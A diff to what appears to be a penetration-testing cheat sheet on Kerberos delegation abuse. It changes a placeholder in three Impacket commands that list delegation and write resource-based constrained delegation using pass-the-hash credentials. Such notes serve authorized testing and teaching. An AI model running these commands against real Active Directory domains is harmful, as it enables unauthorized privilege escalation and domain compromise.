@@ -13,7 +13,7 @@ tags: ["Credential Dumping", "Impacket", "Pass-The-Ticket", "Silver Ticket", "Ti
 
 ```console
 # Check delegation
-sudo ntpdate -s <DC> && impacket-findDelegation '<DOMAIN>/<USER>' -dc-ip <DC> -hashes :<HASH> -k -no-pass
+sudo ntpdate -s <DC_IP> && impacket-findDelegation '<DOMAIN>/<USER>' -dc-ip <DC> -hashes :<HASH> -k -no-pass
 ```
 
 ```console {class="sample-code"}
@@ -33,7 +33,7 @@ delegator$   ms-DS-Group-Managed-Service-Account  Constrained     http/dc01.rebo
 
 ```console
 # Add delegation
-sudo ntpdate -s <DC> && impacket-rbcd '<DOMAIN>/<USER>' -hashes :<HASH> -k -delegate-from '<TARGET_1>' -delegate-to '<USER>' -action write -dc-ip <DC> -use-ldaps
+sudo ntpdate -s <DC_IP> && impacket-rbcd '<DOMAIN>/<USER>' -hashes :<HASH> -k -delegate-from '<TARGET_1>' -delegate-to '<USER>' -action write -dc-ip <DC> -use-ldaps
 ```
 
 ```console {class="sample-code"}
@@ -50,7 +50,7 @@ Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its a
 
 ```console
 # Check
-sudo ntpdate -s <DC> && impacket-findDelegation '<DOMAIN>/<USER>' -dc-ip <DC> -hashes :<HASH> -k -no-pass
+sudo ntpdate -s <DC_IP> && impacket-findDelegation '<DOMAIN>/<USER>' -dc-ip <DC> -hashes :<HASH> -k -no-pass
 ```
 
 ```console {class="sample-code"}
